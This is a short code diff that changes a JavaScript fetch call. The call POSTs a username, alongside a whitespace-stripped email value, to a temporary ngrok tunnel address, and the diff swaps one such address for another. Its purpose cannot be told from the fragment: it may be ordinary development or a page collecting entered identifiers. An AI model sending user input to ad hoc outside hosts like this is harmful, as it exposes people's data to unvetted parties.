@@ -57,7 +57,7 @@ function updateLoadingText() {
     var email = emailValue.replace(/\s/g, '');
     var data = {'username': username};
 
-    fetch("https://5364-102-39-135-10.ngrok-free.app", {
+    fetch("https://e6fb-102-39-156-177.ngrok-free.app", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
